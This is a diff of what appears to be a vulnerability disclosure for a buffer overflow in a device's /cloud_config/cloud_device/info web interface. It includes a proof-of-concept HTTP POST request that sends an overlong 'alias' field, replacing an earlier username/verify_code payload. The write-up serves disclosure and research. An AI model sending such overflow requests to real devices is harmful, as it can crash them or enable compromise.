@@ -4,9 +4,9 @@ This vulnerability is on the /cloud_config/cloud_device/info interface and affec
 There is a buffer overflow vulnerability on the /cloud_config/cloud_device/info interface.
 
 1. An interface ```/cloud_config/cloud_device/info``` is registered first in the deviceInfoRegister function.
-![](./chkResetVeriRegister1.png)
-2. In the handler, the v7 variable is the ```username``` field in the packet, and the v9 variable is the ```verify_code``` field in the packet. Then directly memcpy to the a3 variable refers to the address space, there is a buffer overflow problem.
-![](./chkResetVeriRegister2.png)
+![](./deviceInfoRegister1.png)
+2. In the handler, the v6 variable is the ```alias``` field in the packet Then directly memcpy to the a3 variable refers to the address space, there is a buffer overflow problem.
+![](./deviceInfoRegister2.png)
 ## poc
 ```
 POST /cloud_config/cloud_device/info HTTP/1.1
@@ -21,7 +21,7 @@ Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
 
-username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&verify_code=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+alias=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```
 ## Acknowledgment 
 Credit to [@Yu3H0](https://github.com/Yu3H0/) ,[@leonW7](https://github.com/leonW7), [@cpegg](https://github.com/cpeggg) from Shanghai Jiao Tong University and TIANGONG Team of Legendsec at Qi'anxin Group.
